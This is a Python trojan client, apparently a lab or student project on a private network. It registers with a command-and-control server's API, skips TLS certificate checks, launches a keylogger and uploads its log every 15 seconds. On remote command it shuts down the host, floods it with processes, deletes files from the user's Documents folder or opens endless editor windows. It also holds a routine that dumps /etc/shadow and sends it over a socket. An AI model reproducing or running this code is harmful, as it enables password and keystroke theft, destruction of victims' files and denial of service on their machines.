import socket
import os
import subprocess
import time
import threading
import ssl
import base64
import json
from urllib.request import Request, urlopen
from urllib.parse import urlencode

usingPort = "5555"
server_ip = "192.168.0.17"

hostname = socket.gethostname()
usingIp = socket.gethostbyname(hostname)
usingIp = "192.168.0.14"



def api_call(call_type, server_ip, trojan_ip=None, trojan_port=None, trojan_id=None, status=None, filepath=None):
    creds = ('admin:admin')
    encoded_creds = base64.b64encode(creds.encode('ascii'))

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Create Trojan (POST)
    if call_type == 'create':
        assert trojan_ip and trojan_port
        CREATE_URL = 'https://{SERVER_IP}:5000/api/v1/trojans/create?ip={TROJAN_IP}&port={TROJAN_PORT}'.format(SERVER_IP=server_ip, TROJAN_IP=trojan_ip, TROJAN_PORT=trojan_port)

        req = Request(CREATE_URL, data={})
        req.add_header('Authorization', 'Basic {}'.format(encoded_creds.decode("ascii")))
        resp = urlopen(req, context=ctx)
        readIn = resp.read().decode('utf-8')
        return(readIn)
    elif call_type == 'status':
        assert trojan_id and status == 1 or status == 0
        UPDATE_STATUS_URL = 'https://{SERVER_IP}:5000/api/v1/trojans?id={ID}&status={STATUS}'.format(SERVER_IP=server_ip, ID=trojan_id, STATUS=status)

        req = Request(UPDATE_STATUS_URL, data={})
        req.add_header('Authorization', 'Basic {}'.format(encoded_creds.decode("ascii")))
        req.add_header('Content-Type', 'application/json')
        req.get_method = lambda: 'PUT'
        resp = urlopen(req, context=ctx)
    elif call_type == 'text':
        assert trojan_id and filepath
        UPDATE_TEXT_URL = 'https://{SERVER_IP}:5000/api/v1/trojans?id={ID}'.format(SERVER_IP=server_ip, ID=trojan_id)

        with open(filepath) as fp:
            file_data = fp.read()
        json_data = json.dumps({'logged_text':file_data})
        data = json_data.encode('utf-8')

        req = Request(UPDATE_TEXT_URL, data=data)
        req.add_header('Authorization', 'Basic {}'.format(encoded_creds.decode("ascii")))
        req.add_header('Content-Type', 'application/json; charset=utf-8')
        req.add_header('Content-Length', len(data))
        req.get_method = lambda: 'PUT'
        resp = urlopen(req, context=ctx)
    else:
        pass


def sendLoggedFiles(filepath):
    while True:
    	time.sleep(15)
    	api_call('text', server_ip, usingIp, usingPort, trojanId, 5, filepath)
    	# use the API to send this file, not socket programming like is written below

def sendUpdateMessage():
    while True:
        time.sleep(120)
        api_call('status', server_ip, usingIp, usingPort, trojanId, 1)
        # run curl
    # this is where we send the update message to the server so we can update our IP list
    # using curl

def deleteOldLogs(filepath):
    os.remove(filepath)


def deleteFile():
    # if the nautilus file explorer is open, then take action against the defender
    direct = os.path.expanduser('~/Documents/')
    fileList = os.listdir(direct)
    if len(fileList) > 0:
        os.remove(direct + fileList[0]) #delete a file or directory from their documents!!!

def flood():
    attackAlive = True
    while (attackAlive):
        subprocess.call(['yes', '\x34\x44\x34\x34\x44\x34\x34\x44\x34\x34\x44\x34\x34\x44\x34\x34\x44\x34\x34\x44\x34\x34\x44\x34\x34\x44\x34\x34\x44'])

def shutdownSystem():
    subprocess.call(['shutdown', '-h', 'now'])

def retrievePasswordFile(connection):
    filePath = '/tmp/passSend.txt'
    os.system('cat /etc/shadow > ' + filePath)
    file = open(filepath, rb)
    text = file.read(512)
    while(text):
        connection.send(text)
        text = file.read(512)
    file.close()

def geditBomb():
    
    filePath = os.path.expanduser('~/Documents')
    i = 0
    while True:
        subprocess.call(['gedit', filePath + 'text' + str(i)])
        time.sleep(.5)
        i = i + 1

def killTrojan():
    exit()

def startLogger():
    os.system('python ./keylogger.pyw &')# start the keylogger



def main():

    timeThread = threading.Thread(target=sendUpdateMessage, args=())
    timeThread.daemon = True
    timeThread.start()
    isConnected = False
    if (os.path.isfile('./keylogger.pyw')):
        keyloggerProgramThread = threading.Thread(target=startLogger,args=())
        keyloggerProgramThread.daemon = True
        keyloggerProgramThread.start()
        loggerThread = threading.Thread(target=sendLoggedFiles,args=("./required_libs.txt",))
        loggerThread.daemon = True
        loggerThread.start()
        
    while True:
        using_soc.listen(5)
        conn, conn_addr = using_soc.accept()
        data = conn.recv(8)
        data = data.decode('utf-8', 'strict')
        if data:
            if data == '1':
                shutdownSystem()
            elif data == '2':
                flood()
            elif data == '3':
                deleteFile()
            elif data == '4':
                geditBomb()               
            elif data == '5':
                killTrojan()

                # figure out what to do with this sleep command.



if os.path.isfile('info.txt'):
	with open('info.txt') as fileInfo:
		infoList = fileInfo.readlines()
	info = [x.strip() for x in infoList]
	trojanId = info[0]
else:
	try:
		createOutput=api_call('create', server_ip, usingIp, usingPort)
		idString = createOutput.find('id')
		index = idString + 4
		sub = createOutput[index:(index + 10)]
		endId = sub.find(',')
		trojanId = int(sub[:endId])
		infoFile = open('info.txt', 'w')
		infoFile.write(str(trojanId))
		infoFile.close()
	except:
		pass
using_soc = socket.socket()
using_soc.bind(('',int(usingPort)))

main()

